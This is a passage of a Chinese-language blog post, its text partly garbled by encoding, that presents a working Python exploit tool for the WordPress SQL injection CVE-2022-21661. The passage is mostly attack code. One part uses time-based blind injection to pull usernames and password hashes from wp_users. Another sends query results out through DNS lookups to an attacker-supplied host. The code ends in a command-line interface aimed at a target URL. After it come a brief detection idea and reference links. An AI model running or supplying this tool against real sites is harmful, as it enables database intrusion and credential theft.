<span class="comment"># å¦‚æœleftå’Œrightç›¸å·®1çš„æƒ…å†µä¸‹å¯ä»¥è®¤å®šæ‰¾åˆ°äº†åŒ¹é…çš„å­—ç¬¦ï¼Œæ‰“å°å¹¶é€€å‡º</span></span><br><span class="line">                <span class="keyword">if</span> (left&lt;right-<span class="number">1</span>):</span><br><span class="line">                    left = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    user_login += Dic[left]</span><br><span class="line">                    <span class="built_in">print</span>(user_login)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (left&lt;right-<span class="number">1</span>):</span><br><span class="line">                    right = mid </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># å¦‚æœleftå’Œrightç›¸å·®1çš„æƒ…å†µä¸‹ä»æ—§å°äº$çš„asciiç ï¼Œå³ç©ºå­—ç¬¦ä¸²ï¼Œå³å¯åˆ¤æ–­åˆ°è¾¾äº†æœ«å°¾</span></span><br><span class="line">                    len_login -= <span class="number">1</span></span><br><span class="line">                    is_last = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (is_last):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (len_login!=<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;cracking_param&#125;</span>: <span class="subst">&#123;user_login&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] The <span class="subst">&#123;cracking_param&#125;</span> may not be injectable.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>(<span class="params">url</span>):</span><br><span class="line">    </span><br><span class="line">    headers = gen_headers()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    # æ‰“å°ä¸€æ¬¡SQLæŸ¥è¯¢å¤§æ¦‚çš„æ—¶é—´ï¼Œä¾¿äºè®¾å®šé˜ˆå€¼</span></span><br><span class="line"><span class="string">    data = &#123;</span></span><br><span class="line"><span class="string">        &quot;query&quot;: &#x27;&#123;&quot;tax_query&quot;:&#123;&quot;0&quot;:&#123;&quot;field&quot;:&quot;term_taxonomy_id&quot;,&quot;terms&quot;:[&quot;111) or if(left((select user_pass from wordpress.wp_users),1)=\&#x27;\\$\&#x27;,sleep(2),1)#&quot;]&#125;&#125;&#125;&#x27;,</span></span><br><span class="line"><span class="string">        &quot;ecs_ajax_settings&quot;:  &#x27;&#123;&quot;post_id&quot;:&quot;0&quot;,&quot;current_page&quot;:&quot;0&quot;,&quot;widget_id&quot;:&quot;0&quot;,&quot;theme_id&quot;:&quot;0&quot;,&quot;max_num_pages&quot;:&quot;2&quot;&#125;&#x27;,</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    time1 = time.time()</span></span><br><span class="line"><span class="string">    res = requests.post(url, headers=headers, data=data)</span></span><br><span class="line"><span class="string">    time2 = time.time()</span></span><br><span class="line"><span class="string">    print(time2-time1)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    url = url + <span class="string">&quot;/wp-admin/admin-ajax.php?action=ecsload&quot;</span></span><br><span class="line">    get_userlogin(url,<span class="string">&#x27;user_login&#x27;</span>)</span><br><span class="line">    get_userlogin(url,<span class="string">&#x27;user_pass&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dnslog</span>(<span class="params">url,target,payload</span>):</span><br><span class="line">    headers = gen_headers()</span><br><span class="line">    url = url + <span class="string">&quot;/wp-admin/admin-ajax.php?action=ecsload&quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;select load_file(concat(&#x27;\\\\\\\\\&#x27;,&quot;</span> + payload + <span class="string">&quot;,&#x27;.&quot;</span> + target + <span class="string">&quot;\\\\abc&#x27;))&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;query&quot;</span>: <span class="string">&#x27;&#123;&quot;tax_query&quot;:&#123;&quot;0&quot;:&#123;&quot;field&quot;:&quot;term_taxonomy_id&quot;,&quot;terms&quot;:[&quot;111) or if(1=1,&#x27;</span> + tmp + <span class="string">&#x27;,1)#&quot;]&#125;&#125;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;ecs_ajax_settings&quot;</span>:  <span class="string">&#x27;&#123;&quot;post_id&quot;:&quot;0&quot;,&quot;current_page&quot;:&quot;0&quot;,&quot;widget_id&quot;:&quot;0&quot;,&quot;theme_id&quot;:&quot;0&quot;,&quot;max_num_pages&quot;:&quot;2&quot;&#125;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Dnslog sent to target.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        prog=<span class="string">&quot;CVE-2022-21661 exp&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;CVE-2022-21661 exploit toolkit, &quot;</span>,</span><br><span class="line">        epilog=HELPER_MESSAGE,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--url&quot;</span>,</span><br><span class="line">        metavar=<span class="string">&quot;http://example.com/&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">        nargs=<span class="string">&quot;?&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;the target url&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;url&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--method&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;method&quot;</span>,</span><br><span class="line">        metavar=<span class="string">&quot;getinfo&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">        nargs=<span class="string">&quot;?&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;the exploit method: getinfo,getuser,dnslog&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--target&quot;</span>,</span><br><span class="line">        metavar=<span class="string">&quot;example.com&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">        nargs=<span class="string">&quot;?&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;the dnslog url&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;target&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--payload&quot;</span>,</span><br><span class="line">        metavar=<span class="string">&quot;select version()&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">        nargs=<span class="string">&quot;?&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;the executed sql payload&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;payload&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.url.strip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    method = args.method</span><br><span class="line">    <span class="keyword">if</span> method <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;getinfo&quot;</span>, <span class="string">&quot;getuser&quot;</span>, <span class="string">&quot;dnslog&quot;</span>]:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> method == <span class="string">&quot;getinfo&quot;</span>:</span><br><span class="line">            get_info(url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> method == <span class="string">&quot;getuser&quot;</span>:</span><br><span class="line">            get_user(url)</span><br><span class="line">        <span class="keyword">elif</span> method == <span class="string">&quot;dnslog&quot;</span>:</span><br><span class="line">            target = args.target</span><br><span class="line">            payload = args.payload</span><br><span class="line">            dnslog(url,target,payload)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.print_help()</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Something error: &#123;&#125;, maybe not vulnerable&quot;</span>.<span class="built_in">format</span>(e))</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼Œå…³é—­debugæ¨¡å¼ä¸‹å¯ä»¥ä»¥æ—¶é—´ç›²æ³¨çš„æ–¹å¼è·‘è„šæœ¬ã€‚</p>
<img src="/2022/02/23/CVE-2022-21661/image-20220411144538139-9267068.png" class="" title="image-20220411144538139">

<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç”±äºè¯¥æ¼æ´ä¸»è¦å­˜åœ¨äºæ’ä»¶ä¸­ï¼Œæ™®é€šçš„wordpressç«™ç‚¹ä¸€èˆ¬ä¸å­˜åœ¨å¯ç›´æ¥è°ƒç”¨WP_Queryç±»çš„åœ°æ–¹ï¼Œæˆ‘çš„æƒ³æ³•æ˜¯æ£€æŸ¥å¾…æ£€æµ‹çš„é¡¹ç›®æºç æ˜¯å¦å­˜åœ¨new WP_Queryçš„è°ƒç”¨è¯­å¥ï¼ŒåŒæ—¶wordpressç‰ˆæœ¬&lt;5.8.2ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/WordPress">https://zh.wikipedia.org/wiki/WordPress</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903506520850446">https://juejin.cn/post/6844903506520850446</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.wordpress.org/">https://developer.wordpress.org/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10841">https://xz.aliyun.com/t/10841</a></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/27849312/wordpress-pagination-wp-query-max-num-pages-return-0">https://stackoverflow.com/questions/27849312/wordpress-pagination-wp-query-max-num-pages-return-0</a></p>
<p><a target="_blank" rel="noopener" href="https://www.wpdaxue.com/mastering-wp_query-an-introduction.html">https://www.wpdaxue.com/mastering-wp_query-an-introduction.html</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
        <a target="_blank" class="social-link" href="/atom.xml">
          <span class="icon">
            <i class="fa fa-rss"></i>
          </span>

          <span class="label">RSS</span>
        </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/wordpress/" rel="tag"># wordpress</a>
              <a href="/tags/php/" rel="tag"># php</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/07/31/OOJS/" rel="prev" title="JavaScriptä¸­çš„å¯¹è±¡ã€ç»§æ‰¿åŠåŸå‹é“¾å­¦ä¹ ">
                  <i class="fa fa-chevron-left"></i> JavaScriptä¸­çš„å¯¹è±¡ã€ç»§æ‰¿åŠåŸå‹é“¾å­¦ä¹ 
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Guest</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
